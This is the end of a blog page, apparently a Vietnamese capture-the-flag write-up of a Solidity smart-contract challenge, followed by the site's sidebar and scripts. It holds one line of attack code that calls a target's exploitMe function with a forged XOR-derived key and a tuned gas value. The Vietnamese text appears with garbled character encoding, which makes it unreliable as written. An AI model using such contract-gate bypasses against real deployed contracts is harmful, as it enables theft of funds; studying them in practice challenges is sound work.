        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">97308</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Viá»‡c cÃ²n láº¡i lÃ  thá»±c hiá»‡nÂ <code>submitInstance</code>Â vÃ  chá» mail flag vá»:</p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/24d169be-0e35-4eb1-8c0c-c715b9ed1b46.png" data-recalc-dims="1" /></p>
<h1 id="_references-7">References</h1>
<ul>
<li><a href="https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db" target="_blank" rel="noopener">https://viblo.asia/s/blockchain-smart-contract-Am5yq0mq5db</a></li>
<li><a href="http://solidity.readthedocs.io/en/v0.4.24/" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.24/</a></li>
</ul>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-771" class="share-twitter sd-button share-icon no-text" href="index.html%3Fshare=twitter.html" target="_blank" title="Click to share on Twitter"><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-771" class="share-facebook sd-button share-icon no-text" href="index.html%3Fshare=facebook.html" target="_blank" title="Click to share on Facebook"><span></span><span class="sharing-screen-reader-text">Click to share on Facebook (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>	</div><!-- .entry-content -->
	
	<footer class="entry-meta">
		
			</footer><!-- .entry-meta -->
</article><!-- #post -->
					<nav class="navigation post-navigation" role="navigation">
		<h1 class="screen-reader-text">Post navigation</h1>
		<div class="nav-links">

			<a href="../../../07/17/meepwn-ctf-2018-xss/index.html" rel="prev"><span class="meta-nav">&larr;</span> MEEPWN CTF 2018 - XSS</a>			
		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
					
<div id="comments" class="comments-area">

	
	
</div><!-- #comments -->
			
		</div><!-- #content -->
	</div><!-- #primary -->

	<div id="tertiary" class="sidebar-container" role="complementary">
		<div class="sidebar-inner">
			<div class="widget-area">
						<aside id="recent-posts-6" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
											<li>
					<a href="index.html">MEEPWN CTF 2018 - meepwn contract</a>
									</li>
											<li>
					<a href="../../../07/17/meepwn-ctf-2018-xss/index.html">MEEPWN CTF 2018 - XSS</a>
									</li>
											<li>
					<a href="../../../07/17/meepwn-ctf-2018-pycalx2/index.html">MEEPWN CTF 2018 - PyCalx2</a>
									</li>
											<li>
					<a href="../../../../2017/08/10/wtf-is-safefinderoperatormac-campaign/index.html">What is SafeFinder/OperatorMac campaign?</a>
									</li>
											<li>
					<a href="../../../../2017/07/27/meepwnctf-2017-injection/index.html">MeepwnCTF 2017 - injection</a>
									</li>
					</ul>
		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">justcallmedude</span> on <a href="../../../../2016/11/24/hackyou-ctf-su-2016/index.html#comment-8120">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">zun</span> on <a href="../../../../2016/11/24/hackyou-ctf-su-2016/index.html#comment-7474">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">Tony</span> on <a href="../../../../2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/index.html#comment-7218">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</a></li><li class="recentcomments"><span class="comment-author-link">john</span> on <a href="../../../../2016/09/11/whitehat-contest-11-pwn400/index.html#comment-7211">Whitehat Contest 12 - Pwn400</a></li><li class="recentcomments"><span class="comment-author-link"><a href='../../../../index.html' rel='external nofollow' class='url'>chuymichxinhdep</a></span> on <a href="../../../../2016/09/11/whitehat-contest-11-pwn400/index.html#comment-7210">Whitehat Contest 12 - Pwn400</a></li></ul></aside><aside id="archives-3" class="widget widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
				<li><a href='../../index.html'>August 2018</a></li>
	<li><a href='../../../07/index.html'>July 2018</a></li>
	<li><a href='../../../../2017/08/index.html'>August 2017</a></li>
	<li><a href='../../../../2017/07/index.html'>July 2017</a></li>
	<li><a href='../../../../2017/05/index.html'>May 2017</a></li>
	<li><a href='../../../../2016/11/index.html'>November 2016</a></li>
	<li><a href='../../../../2016/09/index.html'>September 2016</a></li>
	<li><a href='../../../../2016/07/index.html'>July 2016</a></li>
	<li><a href='../../../../2016/04/index.html'>April 2016</a></li>
	<li><a href='../../../../2016/03/index.html'>March 2016</a></li>
	<li><a href='../../../../2015/10/index.html'>October 2015</a></li>
	<li><a href='../../../../2015/09/index.html'>September 2015</a></li>
	<li><a href='../../../../2015/05/index.html'>May 2015</a></li>
	<li><a href='../../../../2015/04/index.html'>April 2015</a></li>
	<li><a href='../../../../2015/02/index.html'>February 2015</a></li>
	<li><a href='../../../../2015/01/index.html'>January 2015</a></li>
		</ul>
			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
				<li class="cat-item cat-item-32"><a href="../../../../category/chuymich/index.html">chuymich</a>
</li>
	<li class="cat-item cat-item-18"><a href="../../../../category/crypto/index.html">crypto</a>
</li>
	<li class="cat-item cat-item-31"><a href="../../../../category/forensic/index.html">forensic</a>
</li>
	<li class="cat-item cat-item-15"><a href="../../../../category/misc/index.html">misc</a>
</li>
	<li class="cat-item cat-item-25"><a href="../../../../category/pwn/index.html">pwn</a>
</li>
	<li class="cat-item cat-item-4"><a href="../../../../category/re/index.html">re</a>
</li>
	<li class="cat-item cat-item-38"><a href="../../../../category/research/index.html">research</a>
</li>
	<li class="cat-item cat-item-47"><a href="../../../../category/smartcontract/index.html">smartcontract</a>
</li>
	<li class="cat-item cat-item-1"><a href="../../../../category/uncategorized/index.html">Uncategorized</a>
</li>
	<li class="cat-item cat-item-9"><a href="../../../../category/vietnamese/index.html">vietnamese</a>
</li>
	<li class="cat-item cat-item-10"><a href="../../../../category/web/index.html">web</a>
</li>
	<li class="cat-item cat-item-30"><a href="../../../../category/whitehat/index.html">whitehat</a>
</li>
		</ul>
			</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="../../../../tag/2015/index.html" class="tag-cloud-link tag-link-36 tag-link-position-1" style="font-size: 8pt;" aria-label="2015 (1 item)">2015</a>
<a href="../../../../tag/babyphd/index.html" class="tag-cloud-link tag-link-35 tag-link-position-2" style="font-size: 8pt;" aria-label="babyphd (1 item)">babyphd</a>
<a href="../../../../tag/backdoorctf/index.html" class="tag-cloud-link tag-link-33 tag-link-position-3" style="font-size: 8pt;" aria-label="backdoorCTF (1 item)">backdoorCTF</a>
<a href="../../../../tag/crypto/index.html" class="tag-cloud-link tag-link-14 tag-link-position-4" style="font-size: 22pt;" aria-label="crypto (3 items)">crypto</a>
<a href="../../../../tag/css/index.html" class="tag-cloud-link tag-link-42 tag-link-position-5" style="font-size: 8pt;" aria-label="css (1 item)">css</a>
<a href="../../../../tag/gaylord/index.html" class="tag-cloud-link tag-link-34 tag-link-position-6" style="font-size: 8pt;" aria-label="gaylord (1 item)">gaylord</a>
<a href="../../../../tag/heap/index.html" class="tag-cloud-link tag-link-37 tag-link-position-7" style="font-size: 8pt;" aria-label="heap (1 item)">heap</a>
<a href="../../../../tag/list-linked/index.html" class="tag-cloud-link tag-link-28 tag-link-position-8" style="font-size: 8pt;" aria-label="list-linked (1 item)">list-linked</a>
<a href="../../../../tag/malware/index.html" class="tag-cloud-link tag-link-43 tag-link-position-9" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
<a href="../../../../tag/mughthesec/index.html" class="tag-cloud-link tag-link-45 tag-link-position-10" style="font-size: 8pt;" aria-label="Mughthesec (1 item)">Mughthesec</a>
<a href="../../../../tag/operatormac/index.html" class="tag-cloud-link tag-link-44 tag-link-position-11" style="font-size: 8pt;" aria-label="OperatorMac (1 item)">OperatorMac</a>
<a href="../../../../tag/pwn/index.html" class="tag-cloud-link tag-link-27 tag-link-position-12" style="font-size: 8pt;" aria-label="pwn (1 item)">pwn</a>
<a href="../../../../tag/re/index.html" class="tag-cloud-link tag-link-26 tag-link-position-13" style="font-size: 8pt;" aria-label="re (1 item)">re</a>
<a href="../../../../tag/side-channel/index.html" class="tag-cloud-link tag-link-29 tag-link-position-14" style="font-size: 8pt;" aria-label="side-channel (1 item)">side-channel</a>
<a href="../../../../tag/sqli/index.html" class="tag-cloud-link tag-link-41 tag-link-position-15" style="font-size: 8pt;" aria-label="sqli (1 item)">sqli</a>
<a href="../../../../tag/unserialize/index.html" class="tag-cloud-link tag-link-40 tag-link-position-16" style="font-size: 8pt;" aria-label="unserialize (1 item)">unserialize</a>
<a href="../../../../tag/xss/index.html" class="tag-cloud-link tag-link-39 tag-link-position-17" style="font-size: 8pt;" aria-label="xss (1 item)">xss</a></div>
</aside>			</div><!-- .widget-area -->
		</div><!-- .sidebar-inner -->
	</div><!-- #tertiary -->

		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
			
			<div class="site-info">
								<a href="https://wordpress.org/">Proudly powered by WordPress</a>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

		<div style="display:none">
	</div>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/babyphd.net\/2018\/08\/01\/meepwn-ctf-2018-meepwn-contract\/":771};
	</script>
				<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/photon/photon.min.js%3Fver=20190201'></script>
<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=202333'></script>
<script type='text/javascript' src='../../../../wp-content/themes/twentythirteen/js/functions.js%3Fver=20160717'></script>
<script type='text/javascript' src='../../../../wp-includes/js/wp-embed.min.js%3Fver=5.2.2'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js%3Fver=7.5.2'></script>
<script type='text/javascript'>
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
</script>
<script type='text/javascript' src='https://stats.wp.com/e-202333.js' async='async' defer='defer'></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:7.5.2',blog:'104079289',post:'771',tz:'0',srv:'babyphd.net'} ]);
	_stq.push([ 'clickTrackerInit', '104079289', '771' ]);
</script>
</body>
</html>